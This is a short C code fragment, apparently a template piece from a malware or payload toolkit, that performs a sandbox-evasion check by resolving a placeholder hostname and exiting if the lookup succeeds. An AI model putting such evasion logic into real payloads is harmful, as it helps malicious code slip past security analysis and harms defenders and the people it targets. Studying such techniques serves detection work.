#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>


//evading with gethostbyname technique
#ifdef PRINT_DEBUG
	printf("use  gethostbyname sandbox evasion\n");
#endif
struct hostent *hp = gethostbyname(KVALUE);
if (hp != NULL) { 		
	exit(0);
}